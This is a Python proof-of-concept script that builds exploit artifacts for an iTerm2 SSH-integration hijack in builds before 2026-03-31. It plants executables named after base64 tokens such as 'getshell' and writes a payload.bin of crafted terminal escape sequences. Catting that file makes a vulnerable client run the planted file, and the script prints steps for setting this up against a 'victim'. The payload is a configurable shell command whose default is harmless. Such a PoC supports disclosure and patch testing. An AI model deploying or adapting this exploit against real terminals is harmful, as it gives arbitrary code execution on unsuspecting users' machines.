#!/usr/bin/env python3
import argparse
import base64
import os
import stat
import textwrap


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def build_payload(command: str) -> str:
    return textwrap.dedent(
        f"""\
        #!/bin/sh
        echo "[*] iTerm2 SSH integration pre-framer hijack fired: $0" >&2
        {command}
        exit 0
        """
    )


def write_executable(path: str, command: str) -> None:
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(build_payload(command))
    os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def generate_simple(outdir: str, trigger: str, payload: str) -> None:
    trigger_path = os.path.normpath(os.path.join(outdir, trigger))
    write_executable(trigger_path, payload)

    print(f"Created: {trigger_path}")
    print()
    print("Trigger details:")
    print(f"  getshell      -> {b64('getshell')}")
    print(f"  pythonversion -> {b64('pythonversion')}")
    print(f"  runpython     -> {b64('runpython')}")
    print()
    if "/" in trigger:
        print("Slash-containing triggers are relative paths, not PATH lookups.")
        print(f"Run the victim from: {outdir}")
        print(f"Expected relative path: {trigger}")
    else:
        print("Bare-name triggers are resolved via PATH.")
        print("On the remote account, ensure this directory is already in PATH or prepend it:")
        print(f"  export PATH={outdir}:$PATH")
    print()
    print("Then connect from a vulnerable iTerm2 build using SSH integration.")
    print("If the target is patched, the random line prefix prevents this filename match.")


def generate_currentdir(outdir: str, remote_command: str, payload: str) -> None:
    encoded_sshargs = b64(f"localhost {remote_command}")
    trigger = b64(f"run {remote_command}")
    trigger_path = os.path.join(outdir, trigger)
    payload_path = os.path.join(outdir, "payload.bin")
    write_executable(trigger_path, payload)

    stream = (
        f"\x1bP2000pnone 1234 = - {encoded_sshargs}\n"
        "\x1b]135;:begin 1\x1b\\"
        "\x1b]135;:/bin/sh\n/tmp\nGNU bash, version 5.2.0\x1b\\"
        "\x1b]135;:end 1 0 r\x1b\\"
        "\x1b]135;:begin 2\x1b\\"
        "\x1b]135;:python missing\x1b\\"
        "\x1b]135;:end 2 1 r\x1b\\"
    )
    with open(payload_path, "wb") as f:
        f.write(stream.encode("latin1"))

    print(f"Created trigger: {trigger_path}")
    print(f"Created stream:  {payload_path}")
    print()
    print("Current-directory variant:")
    print(f"  remote command    -> {remote_command}")
    print(f"  emitted token     -> {trigger}")
    print(f"  relative path     -> {trigger}")
    print()
    print("Hostile-side primitive:")
    print(f"  cd {outdir}")
    print("  cat payload.bin")
    print()
    print("This variant does not rely on PATH. It relies on the slash in the emitted token")
    print("causing the shell to resolve a relative path under the current directory.")
    print("This plain cat replay was verified against the real iTerm2 app.")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Generate PoC artifacts for the pre-2026-03-31 iTerm2 SSH integration hijack."
    )
    parser.add_argument(
        "--dir",
        default="./iterm2-hijack-bin",
        help="Base directory to populate with malicious helper paths.",
    )
    parser.add_argument(
        "--payload",
        default='id > "$HOME/.iterm2-poc-fired"',
        help="Shell command to run when the trigger executes.",
    )
    parser.add_argument(
        "--mode",
        choices=["simple", "currentdir"],
        default="simple",
        help="Generate a direct trigger path or the verified current-directory payload.bin variant.",
    )
    parser.add_argument(
        "--trigger",
        default=b64("getshell"),
        help="For --mode simple: executable token to plant.",
    )
    parser.add_argument(
        "--remote-command",
        default="X^Gn?,P/jYFn=02",
        help="For --mode currentdir: remote command whose run-token should be planted as a relative path.",
    )
    args = parser.parse_args()

    outdir = os.path.abspath(args.dir)
    os.makedirs(outdir, exist_ok=True)

    if args.mode == "currentdir":
        generate_currentdir(outdir, args.remote_command, args.payload)
    else:
        generate_simple(outdir, args.trigger, args.payload)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
